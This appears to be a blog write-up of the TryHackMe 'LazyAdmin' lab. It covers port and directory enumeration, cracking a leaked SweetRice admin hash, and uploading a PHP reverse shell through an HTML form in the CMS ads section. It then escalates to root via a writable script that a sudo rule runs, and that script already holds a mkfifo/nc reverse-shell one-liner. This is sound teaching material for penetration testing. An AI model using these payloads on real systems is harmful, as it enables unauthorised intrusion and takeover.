---
layout: post
title: THM LazyAdmin WriteUp
date: 2025-03-12
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - Linux
  - Web-Fuzzing
  - Credentials-Leakage
  - Database-Backup
  - Reverse-Shell
  - Privilege-Escalation
  - Sudoers-Abusing
  - Script-Modification
media_subpath: /assets/img/LazyAdmin
---
![Desktop View](LazyAdmin.jpeg){: w="400"  h="400" }



# LazyAdmin Skills


>**LazyAdmin** is an easy Linux machine where we will use the following skills:

- **Port Discovery**
- **Web Application Enumeration**
- **Directory and File Fuzzing**
- **Credential Discovery from Database Backup**
- **Exploiting Web Application for Reverse Shell Execution**
- **Reverse Shell Execution**
- **Linux Privilege Enumeration**
- **Exploiting Misconfigured Sudoers Permissions**
- **Privilege Escalation via Script Modification**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **22, 80, 139** & port **445**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.44.218 -oG allPorts
Nmap scan report for 10.10.44.218
Host is up, received user-set (0.16s latency).
Scanned at 2025-03-11 23:39:50 CET for 19s
Not shown: 65244 closed tcp ports (reset), 289 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p22,80 10.10.44.218 -oN targeted
Nmap scan report for 10.10.44.218
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So we have to check the following ports & services:

- **Port  22 -->  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8**
- **Port 80 -->  Apache httpd 2.4.18**

Let's start with the **HTTP** service.

---
## Port 80 Enumeration

Checking the `nmap` report, the website seems like  a default **Apache** page, let's check it.

![Desktop View](LazyAdminMainPage.png)

As expected, so let's fuzz in order to find subdirectories.

```bash
❯ gobuster dir -u http://10.10.44.218 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.44.218
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.10.44.218/content/]
/server-status        (Status: 403) [Size: 277]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

We have found a subdirectory named `content`, let's check what we are facing via browser.

![Desktop View](LazyAdminMainPage2.png)

We can see that we are facing a **SweetRice** CMS, the page seems like it's disabled, so let's fuzz the `/content` directory this time.

```bash
❯ gobuster dir -u http://10.10.44.218/content -w /usr/share/seclists/Discovery/Web-Content/big.txt -t64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.44.218/content
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/_themes              (Status: 301) [Size: 322] [--> http://10.10.44.218/content/_themes/]
/as                   (Status: 301) [Size: 317] [--> http://10.10.44.218/content/as/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.44.218/content/attachment/]
/images               (Status: 301) [Size: 321] [--> http://10.10.44.218/content/images/]
/inc                  (Status: 301) [Size: 318] [--> http://10.10.44.218/content/inc/]
/js                   (Status: 301) [Size: 317] [--> http://10.10.44.218/content/js/]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

We have found quite a list of subdirectories, so let's check them.

The `/as` directory hosts the login page of the **SweetRice** CMS, i tried some default credentials but none worked, so let's keep enumerating.

![Desktop View](LazyAdminLoginPage.png)

The `/attachment` dir is empty.

Checking the `/inc` directory have a big amount of files and directories, but after a bit of research I've found a directory named `mysql_backup`, and inside the folder we can see a file named `mysql_bakup_20191129023059-1.5.1.sql`.

if we download the file and search for any credentials inside we can found an user and a **MD5** hash: `manager:42f749ade7f9e195bf475f37a44cafcb`

```bash
❯ cat mysql_bakup_20191129023059-1.5.1.sql | grep pass
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

Let's decode the **MD5** hash using a online tool like [CrackStation](https://crackstation.net).

![Desktop View](LazyAdminCrackStation.png)

Credentials found, let's try the `manager:Password123` in the login page at ***http://10.10.44.218/content/as/***.

Once inside we are in front of the **SweetRice** dashboard.

![Desktop View](LazyAdminDashboard.png)

We can now see the version of the **CMS**, so let's see if there is any publicly available exploit for the **SweetRice 1.5.1** version.

```bash
❯ searchsploit sweetrice 1.5.1
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download                                                                                                               | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                                 | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                     | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                            | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                       | php/webapps/40700.html
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

We have found 5 exploits, i checked some of them and the easiest way to get **RCE** is to upload a file via the **Media Center** section, but i found more fun using the **ads** section.

We can add an ad where we can add `PHP` code, then access it via from this URL: `http://10.10.44.218/content/inc/ads/`, so let's begin by configuring the ad.

We have to name the ad as `shell` and then paste the following payload.

```bash
<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.44.218/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="shell"/>
<textarea type="hidden" name="adv">
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.14.99.119';
$port = 443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

<REDACTED>

&lt;/textarea&gt;
</form>
</body>
</html>
```

![Desktop View](LazyAdminReverseShell.png)

The redacted section is just the [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) reverse shell, once saved we can just set a listener at port 443.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
```

Then access the next path: `http://10.10.44.218/content/inc/ads/shell.php` and we should have received the reverse shell.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [10.14.99.119] from (UNKNOWN) [10.10.44.218] 35702
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 01:39:44 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ 
```

---
## Shell as www-data

### TTY Treatment 

Once we get the reverse shell, let's find a way to scale privileges, but before, we have to get a fully interactive shell, there are multiple ways but i like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Make a `stty size` in your own shell to know the rows and columns.

### Privilege Escalation

Once with a stable shell and  as `www-data` we can read the `user.txt` flag at `/home/itguy/user.txt`.

```bash
www-data@THM-Chal:/$ cat /home/itguy/user.txt 
THM{***************************}
```

Now we can begin with the **privilege escalation** phase, after a bit of research i checked the **Sudoers** privileges and i found that we can run a `perl` script named  `backup.pl` as `root`.

```bash
www-data@THM-Chal:/$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Checking what this script does, we can see that it executes a script located at `/etc/copy.sh`.

```bash
www-data@THM-Chal:/$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

Checking the content of the `/etc/copy.sh` script seems like it sends a reverse shell to the `192.168.0.190` IP address (this seems like a miss-configuration of the machine).

```bash
www-data@THM-Chal:/$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Checking the permissions of this bash script we can see that is owned by `root` but we can modify it as others.

```bash
www-data@THM-Chal:/$ ls -l /etc/copy.sh  
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

So, let's modify it's content to spawn a elevated shell.

```bash
www-data@THM-Chal:/$ echo "/bin/bash -p" > /etc/copy.sh
www-data@THM-Chal:/$ cat /etc/copy.sh
/bin/bash -p
```

What remains is execute the `backup.pl` script as `root` and it should spawn us a elevated shell.

```bash
www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl 
root@THM-Chal:/# whoami
root
```

Once as `root` we can read the `root.txt` flag at `/root/root.txt`.

```bash
root@THM-Chal:/# cat /root/root.txt 
THM{**************************}
```

---
## Final Thoughts

The **LazyAdmin** machine on TryHackMe is an excellent exercise in **web application enumeration**, **credential discovery**, and **privilege escalation**. The initial phase involves using fuzzing to uncover a hidden login page and a database backup file, which contains valid credentials. This highlights the importance of thorough enumeration and the risks of leaving sensitive files exposed. Gaining initial access requires crafting a **malicious ad** to trigger a reverse shell, demonstrating the potential dangers of improper input validation and insecure file handling. The privilege escalation phase involves exploiting a **misconfigured sudoers permission**, where a Perl script executes a Bash script as root. By modifying the Bash script due to improper permissions, a root shell is obtained. This machine effectively reinforces skills in **web fuzzing, credential harvesting, reverse shell execution, and privilege escalation**, making it a valuable learning experience for aspiring penetration testers.

![Desktop View](LazyAdminPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

